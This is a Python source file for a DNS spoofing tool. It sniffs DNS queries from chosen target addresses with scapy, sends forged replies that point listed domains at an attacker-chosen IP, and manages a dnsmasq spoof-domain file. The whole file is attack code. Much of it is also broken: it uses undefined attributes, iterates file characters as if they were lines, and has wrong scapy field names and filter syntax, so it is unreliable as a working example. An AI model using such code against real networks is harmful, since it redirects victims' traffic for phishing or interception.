import os
from interface import Interface
from scapy.all import *

class DNSSpoof:
	def __init__(self, interface, domain_file):
		self.service = 'dnsmasq'
		self.active = False
		self.interface = Interface(interface, True)
		self.interface.enable_sniff()
		self.domain_file = domain_file

		self.domains = list()
		self.load_domains()

######################################################################################################################
###################################################### DNSMasq  ######################################################
######################################################################################################################

	def load_domains(self):
		with open(self.domain_file, 'r') as f:
			for line in f.read(): self.domains.append(line)

	def start_dns(self):
		os.system('service {} start'.format(self.service))
		self.active = True

	def stop_dns(self):
		os.system('service {} stop'.format(self.service))
		self.active = False

	def restart_dns(self):
		os.system('service {} restart'.format(self.service))
		self.active = True

	def exist_domain(self, domain):
		with open(self.domain_file, 'r') as f:
			for line in f.read():
				if domain in line: return True
		return False

	def add_spoof_domain(self, domain):
		if not self.exist_domain(domain):
			with open(self.domain_file, 'a') as f:
				line = '{Domain} {Server}'.format(Domain=self.domain, Server=self.server)
				f.write(line)
				return 'domain_added'
		else:
			return 'domain_exist'
			

	def delete_spoof_domain(self, domain):
		if self.exist_domain(domain):
			with open(self.domain_file, 'rw') as f:
				lines = f.read().split('\n')
				lines.remove('{Domain} {Server}'.format(Domain=domain, Server=self.server))
				f.write('\n'.join(lines))

######################################################################################################################
####################################################### SCAPY  #######################################################
######################################################################################################################

	
	def start(self):
		self.sniff_thread = threading.Thread(target=self._sniff_packet)
		self.sniff_thread.daemon = True
		self.sniff_thread.start()

	def send_spoofed_response(self, dest_ip, dest_port, domain):
		response = DNSRR(rrname=domain.qname,ttl=1,rdata=self.ip)
		send(IP(dst=dest_ip)/UDP(dport=dest_port)/DNS(qr=1,ar=response))

	def _sniff_packet(self):
		self.interface.enable_sniff()
		sniff(prn=self._process_packet, iface=self.interface.get_monitor_interface_id(), stop_filter = lambda x: not self._should_continue, filter="dns.qry.type == 1", store=0)

	def _process_packet(self, packet):
		packet.show()
		ip = packet.getlayer(IP)
		udp = packet.getlayer(UDP)
		if ip.src in self.targets:
			dns = packet.getlayer(DNS)
			if dns.query.name in self.domains:
				self.send_spoofed_response(ip.src, udp.src_port, dns.qd)
